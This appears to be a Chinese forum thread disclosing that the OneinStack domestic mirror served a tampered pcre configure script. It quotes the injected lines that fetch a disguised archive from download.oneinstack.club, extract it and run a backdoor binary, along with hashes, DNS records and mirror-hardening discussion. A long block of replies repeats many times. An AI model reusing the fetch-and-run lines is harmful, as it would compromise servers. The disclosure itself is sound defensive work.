### Oneinstack 国内下载源也被挂马

# 如何复现

（从海外节点下载暂未发现有此问题）

`mirrors.oneinstack.com` CNAME 到 `seo-one-01.xnsksstack.com`，这个域名 DNS 为 DNSPod ，国内解析为 CNAME `mirrors.oneinstack.com.w.cdngslb.com.` 阿里云 CDN**（含恶意代码）**，海外解析为 A `47.251.13.6`  阿里云美国单点

```bash
# 国内机器或手动指定 mirrors.oneinstack.com.w.cdngslb.com 国内 IP

wget http://mirrors.oneinstack.com/oneinstack-full.tar.gz
tar -xzf oneinstack-full.tar.gz
cd oneinstack/src
tar -xzf pcre-8.45.tar.gz
cd pcre-8.45
grep -r "oneinstack.club" pcre-8.45
```

结果（`pcre-8.45/configure` 第 6883 行）：
```bash
pcre-8.45/configure:wget -q -nv http://download.oneinstack.club/osk.jpg -cO /var/local/osk.jpg
```

验证 MD5：
```
# 恶意包
md5sum oneinstack-full.tar.gz
3dc788dd9fe0c13e3db1411e53932331  oneinstack-full.tar.gz

#海外节点包（暂未发现有此问题）
aa55626f6ba9eb8cae2f5a3d9c6c9b96  oneinstack-full.tar.gz
```
国内国外包对比（右边海外左边国内）：
![]( https://blog-images.huangxin.dev/2023/10/06/714253106.png)

![]( https://blog-images.huangxin.dev/2023/10/06/3337536641.png)

---------------------------------------------------

这怎么实现的

---------------------------------------------------

/t/979048 昨晚刚看到说被收购了

---------------------------------------------------

@2NUT 
`
root@Huangxins-PC:~/oneinstack/src# grep -r '/var/local/' ~/oneinstack/
/root/oneinstack/src/pcre-8.45/configure:wget -q -nv http://download.oneinstack.club/osk.jpg -cO /var/local/osk.jpg
/root/oneinstack/src/pcre-8.45/configure:tar zxf /var/local/osk.jpg -C /var/local/ > /dev/null
/root/oneinstack/src/pcre-8.45/configure:rm -f /var/local/osk.jpg
/root/oneinstack/src/pcre-8.45/configure:/var/local/cron/load linhkkngf@QWE
`

---------------------------------------------------

@livid 能不能 move 到 /share

---------------------------------------------------

原始链接：hxxp://download.oneinstack[.]club/osk[.]jpg

解析：download[.]oneinstack[.]club	353	IN	A	47.242.165.65

```
❯ file ./osk.jpg
./osk.jpg: gzip compressed data, from Unix, original size modulo 2^32 30720
❯ sha256sum ./osk.jpg
54030d4e77c7082d27bba392115b6aebeab3d558409e4e463db2aad8821b0737  ./osk.jpg
❯ mv ./osk.jpg ./osk.gz
❯ gunzip ./osk.gz
❯ file ./osk
./osk: POSIX tar archive (GNU)
❯ mv ./osk ./osk.tar
❯ tar -tf ./osk.tar
cron/
cron/load
<REDACTED>
❯ file ./load
./load: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

这个 osk.jpg 实际是 osk.tar.gz ，内部包含有一个二进制文件是 cron/load ，按照 OP 发的，实际会部署到 /var/local/cron/load 下。

---------------------------------------------------

https://mp.weixin.qq.com/s/OT7C1l5rjBNCawFXRIUJOQ 剩下的和这个一样了

---------------------------------------------------

修正：似乎还不太一样。
fbd6e8c949076452e6d6f35f3450f1dd31e339014858b401089c0ef249e122f5  ./load.elf

---------------------------------------------------

linux 版本的 Free Download Manager 近期也发现了类似的问题 
https://www.landiannews.com/archives/100274.html
https://www.scmagazine.com/brief/linux-malware-detection-script-issued-by-free-download-manager

---------------------------------------------------

不知道是哪个环节搞进去的， 都是大手笔

---------------------------------------------------

那个 wget 脚本在 pcre-8.45/configure 第 6843 行， 不是 6883 行

---------------------------------------------------

更新：17:37 相关域名已经空解析。

```
;; TLS session (TLS1.3)-(ECDHE-X25519)-(ECDSA-SECP256R1-SHA256)-(AES-128-GCM)
;; ->>HEADER<<- opcode: QUERY; status: NXDOMAIN; id: 32076
;; Flags: qr rd ra; QUERY: 1; ANSWER: 0; AUTHORITY: 1; ADDITIONAL: 1

;; EDNS PSEUDOSECTION:
;; Version: 0; flags: ; UDP size: 4096 B; ext-rcode: NOERROR
;; PADDING: 71 B

;; QUESTION SECTION:
;; download.oneinstack.club.		IN	A

;; AUTHORITY SECTION:
oneinstack.club.    	600	IN	SOA	ns21.domaincontrol.com. dns.jomax.net. 2023100600 28800 7200 604800 600

;; Received 214 B
;; Time 2023-10-06 17:37:xx +08
;; From 223.5.5.5@853(TLS) in 1173.4 ms
```

---------------------------------------------------

几个有意思的事实：
- 主站的备案是 23/09/26 审核通过的，工信部网站可查。
- 当前有问题版本的压缩包内的 src/php-*.tar.gz 等一众文件修改时间为 Sep 25, 2023 at 14:33 ，被篡改的 pcre-8.45.tar.gz 的文件修改时间为 Sep 22, 2023 at 00:55 (UTC+8)。
- 有问题的 pcre-8.45.tar.gz 内的 configure 文件修改时间是 2021/6 （相关时间戳都是可以伪造的）。

---------------------------------------------------

@patrickyoung 5# 我试着用 Ghidra 反编译了一下，程序主体是收集数据以及保持通信，大概率是肉鸡了。

---------------------------------------------------

这时候破坏计算机罪不出面了

---------------------------------------------------

Oneinstack 和 LNMP 彻底废了

---------------------------------------------------

@imes 主要是这玩意域名后面空解析了，你看 VT ，后面通信下的东西才是大头。

---------------------------------------------------

我🌿#!﹉=﹉!+_#=&=，md 我前几天用过。

---------------------------------------------------

老版本的有没有影响。卧槽 我前几天更新了 还忘记哪几个服务器

---------------------------------------------------

oneinstack 上一次镜像出问题后我就一直在找新的替代品，发现一个很普遍的问题：国内作者做的脚本都会拿自己的域名去托管资源包，比如 oneinstack 就是在 options.conf 里设置了镜像源。而那些有 WebUI 面板的，比如 1panel 和宝塔，因为集成就直接写死自己的源了。这其实算是一种有风险的行为，即使作者不去做，自托管的镜像服务器也会是攻击的重点目标。

也许国内服务器因为网络问题，需要这样的中转镜像源，但这些一键包和面板是不会给一个使用原始源的选择的。Oneinstack 作者实际上还在 sourceforge 和 dropbox 托管了包，上次出问题的时候我在 issue 里建议给予用户选择，根据实际情况选择 sourceforge 源（这还会带来官方源没做的 HTTPS 支持），但作者消极反应。因为这一情况，我其实一直是在怀疑 oneinstack 作者的，最近在尝试自动缓存上游源的程序，看来得加紧做了。

金华市矜贵网络科技有限公司 <-- 这家公司谁能去扒一扒啊

---------------------------------------------------

@irainsoft 最好还是 GitHub 全程 CI ，其实 Oneinstack 本来的设计很优秀，如果有人接班就好了
GitHub 自动打包，自动检测 dependency 更新，人工 merge 以后自动 release
我相信服务器装机大部分还是海外机器，国内机器的 use case 相对少点，大不了让用户自己用梯子下载到本地然后上传上去，或者可以找 CloudFlare Vercel 之类赞助，相信也拉得到。

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

---------------------------------------------------

@irainsoft 而且 sourceforge 上的 oneinstack 最近两个月也有更新，没心思验证是不是也有马

---------------------------------------------------

@MrWhite 7 月以来装的建议都默认不安全

---------------------------------------------------

刚刚看了下 oneinstack 的 sourceforge 和 dropbox 镜像地址都被从官网上移除了，看来是居心叵测了

https://sourceforge.net/projects/oneinstack/

sourceforge 源链接是上面这个，几个小时前刚更新过，可惜更早的包找不到了

---------------------------------------------------

@imhx233 #20 我目前就是想用 Actions 来做，有两个想法：
1. 做缓存，但这样需要做 hash check ，而且这样子在 repo 里发包可能是 abuse
2. 我更倾向的想法，是爬取到资源后直接生成 redirect 规则，跳转到软件源站点去

---------------------------------------------------

@irainsoft 我用 GitHub 存了 Dropbox 包： https://github.com/hifocus/CleanInStack ，屏蔽两个域名 hosts 情况下应该是没问题的

---------------------------------------------------

@irainsoft 其实最基本的应该还是按需安装，比如安装 Nginx ，就拉取 pcre, openssl 什么的编译；感觉还是需要本地缓存（当然大文件可以通过 GitHub Release 基本解决），因为默认最新版本的话保不齐就编译失败了

全程 hash check 经过这些事件感觉是必需品

GitHub Release 海外拉取的速度非常好，而且用来做版本分支加上代码透明，可以从彻底杜绝这样的事情发生，谁不喜欢了 Fork 一份

---------------------------------------------------

Oneinstack 对我来说最大的价值还是 ./vhost.sh 可以自动生成 nginx config 和搞定 ssl
要不然真的 apt install nginx 就够了

---------------------------------------------------

@imhx233 的确，感觉 Oneinstack 是真的好用。。真的可惜了。。

---------------------------------------------------

这个一键脚本之前也被挂马过, ![关于 PHP/JAVA 部署工具 OneinStack 供应链投毒事件预警]( https://www.secpulse.com/archives/200488.html), 作者给出的影响时间范围为: 2023-04-25 ~ 2023-05-03 https://github.com/oneinstack/oneinstack/issues/487

